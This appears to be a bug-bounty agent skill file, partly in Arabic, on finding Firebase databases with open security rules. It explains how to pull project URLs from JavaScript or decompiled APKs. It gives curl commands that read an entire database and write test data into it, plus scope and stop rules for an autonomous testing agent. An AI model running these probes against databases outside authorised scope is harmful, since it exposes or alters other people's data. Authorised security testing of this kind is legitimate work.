# SKILL: Firebase Realtime DB / Firestore open rules → full read/write (classic high impact)

**Skill id:** `tip/firebase-realtime-db-firestore-open-rules-full-readwrite-classic-high-impact`  
**Category:** API Hacking, Recon  
**Rating:** 🔥 قوية  
**Status:** Not started  
**Notion:** https://app.notion.com/p/401dac31e88081ff8b3bd1313582d5bb  

> **Authorized testing only.** LEAD until validated on accounts/objects you own. Never auto-confirm.

## When the agent should use this skill

- Hunting track involves: **API Hacking, Recon**
- Target signals match this technique
- Scope and testing envelope confirmed

## How It Works

من الـ JS أو APK (apktool + grep firebaseio) خد الـ project URL. جرب /.json. لو data رجعت = public read. جرب POST/PUT عشان write. حتى لو Permission denied، جرب self-register + auth != null rules.

## Payload / Code

```
curl [https://PROJECT.firebaseio.com/.json](https://PROJECT.firebaseio.com/.json)
curl -X PUT -d '\{"test":"bounty"\}' [https://PROJECT.firebaseio.com/test.json](https://PROJECT.firebaseio.com/test.json)
```

## Source

Multiple writeups + Intigriti Firebase guide + mobile APK decompile tips

## Agent execution contract

1. Confirm asset is in authorized scope.
2. Baseline with an account/object you control.
3. Apply **one** mutation from the payload at a time.
4. Discriminate benign explanations (cache, public data, UI-only).
5. Classify as **LEAD** until unauthorized consequence is proven.
6. Stop if real third-party data appears beyond minimal evidence.
7. Hand off to report template only after validation checklist passes.

---
_Synced from Notion Bug Bounty Tips and Tricks · agent skill ready._
